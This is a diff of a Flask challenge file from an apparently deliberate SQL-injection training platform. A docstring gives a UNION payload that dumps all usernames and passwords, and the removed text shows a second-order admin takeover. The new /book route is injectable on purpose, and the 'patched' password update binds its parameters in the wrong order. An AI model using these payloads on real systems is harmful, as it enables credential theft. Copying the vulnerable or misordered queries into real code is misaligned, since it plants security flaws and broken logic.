@@ -8,32 +8,31 @@ from flask import (
     url_for,
     session,
     request,
-    flash
+    flash,
+    jsonify
 )
-from sqli_platform import app, clog, db
-from sqli_platform.utils.challenge import get_flag, get_config, format_query
+from sqli_platform import app, app_log, db
+from sqli_platform.utils.challenge import get_config, format_query
 
 """
 The login function has been patched.
 The notes function has been patched.
+password update function is patched.
 
-Create user:
-username: admin' -- -
-password: whatever
+Exploit:
+challenge7/book?title='+union+select'-1''+union+select+1,2,group_concat(password),group_concat(username)+from+users--
 
-Change password, enter old password <whatever> and set something new. 
-Login with:
-username: admin
-password: <password set in previous step>
+' union select'-1'' union select 1,2,group_concat(password),group_concat(username) from users--
+
 """
 
-_bp = "challenge5"
-challenge5 = Blueprint(_bp, __name__,
-                       template_folder="templates", url_prefix=f"/{_bp}")
+_bp = "challenge7"
+challenge7 = Blueprint(
+    _bp, __name__, template_folder="templates", url_prefix=f"/{_bp}")
 _templ = "challenges/challenge1"
 _query = []
 
-@challenge5.context_processor
+@challenge7.context_processor
 def sessions():
     """
     
@@ -59,8 +58,8 @@ def login_required(f):
     return decorated_function
 
 
-@challenge5.route("/")
-@challenge5.route("/login", methods=["GET", "POST"])
+@challenge7.route("/")
+@challenge7.route("/login", methods=["GET", "POST"])
 def login():
     global _query
 
@@ -70,24 +69,23 @@ def login():
 
         if not (username and password):
             flash("Username or Password cannot be empty.", "warning")
-            return redirect(url_for("challenge5.login"))
+            return redirect(url_for(f"{_bp}.login"))
 
         query = "SELECT id, username FROM users WHERE username = ? AND password = ?"
         params = [username, password]
         _query.append((query, params))
-
         user = db.sql_query(_bp, query, params, one=True)
 
         if user:
             session[f"{_bp}_user_id"] = user["id"]
             session[f"{_bp}_username"] = user["username"]
-            return redirect(url_for("challenge5.home"))
+            return redirect(url_for(f"{_bp}.home"))
         else:
             flash("Invalid username or password.", "danger")
     return render_template(f"{_templ}/login.html")
 
 
-@challenge5.route("/signup", methods=["GET", "POST"])
+@challenge7.route("/signup", methods=["GET", "POST"])
 def signup():
     global _query
 
@@ -101,8 +99,9 @@ def signup():
 
         # No error checking etc...
         query = "SELECT username FROM users WHERE username=?"
-        _query.append((query, [username]))
-        if db.sql_query(_bp, query, [username]):
+        params = [username]
+        _query.append((query, params))
+        if db.sql_query(_bp, query, params):
             flash("Username already exists.", "danger")
         else:
             query = "INSERT INTO users (username, password) VALUES (?, ?)"
@@ -113,17 +112,13 @@ def signup():
     return render_template(f"{_templ}/registration.html")
 
 
-@challenge5.route("/home")
+@challenge7.route("/home")
 @login_required
 def home():
-    sess = session.get(f"{_bp}_user_id", None)
-    f = ""
-    if sess == 1:
-        f = get_flag(_bp)
-    return render_template(f"{_bp}/index.html", flag=f)
+    return render_template(f"{_bp}/index.html")
 
 
-@challenge5.route("/notes", methods=["GET", "POST"])
+@challenge7.route("/notes", methods=["GET", "POST"])
 @login_required
 def notes():
     global _query
@@ -140,7 +135,6 @@ def notes():
         query = "INSERT INTO notes (username, title, note) VALUES (?, ?, ?)"
         params = [user["username"], title, note]
         _query.append((query, params))
-
         db.sql_insert(_bp, query, params)
         return redirect(url_for(f"{_bp}.notes"))
 
@@ -151,7 +145,7 @@ def notes():
     return render_template(f"{_templ}/notes.html", notes=notes, user=user["username"])
 
 
-@challenge5.route("/changepwd", methods=["GET", "POST"])
+@challenge7.route("/changepwd", methods=["GET", "POST"])
 @login_required
 def changepwd():
     global _query
@@ -174,16 +168,36 @@ def changepwd():
             flash("Wrong password supplied.", "danger")
             return redirect(url_for(f"{_bp}.changepwd"))
 
-        query = f"UPDATE users SET password = ? WHERE username = '{user['username']}'"
-        _query.append(query)
-        db.sql_insert(_bp, query, [new_pwd])
+        query = f"UPDATE users SET password = ? WHERE username = ?"
+        params = [user['username'], new_pwd]
+        _query.append((query, params))
+        db.sql_insert(_bp, query, params)
+
         flash("Password changed", "info")
         return redirect(url_for(f"{_bp}.changepwd"))
     return render_template(f"{_templ}/updatepwd.html")
 
 
-@challenge5.route("/logout")
+@challenge7.route("/logout")
 def logout():
     session.clear()
     return redirect(url_for(f"{_bp}.login"))
 
+
+@challenge7.route("/book", methods=["GET"])
+@login_required
+def book():
+    global _query
+
+    if request.method == "GET":
+        title = request.args.get("title", "")
+        book = {}
+
+        query = f"SELECT id FROM books WHERE title like '{title}%'"
+        _query.append(query)
+        bid = db.sql_query(_bp, query, one=True)
+        if bid:
+            query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
+            _query.append(query)
+            book = db.sql_query(_bp, query)
+        return render_template(f"{_templ}/book.html", data=book)
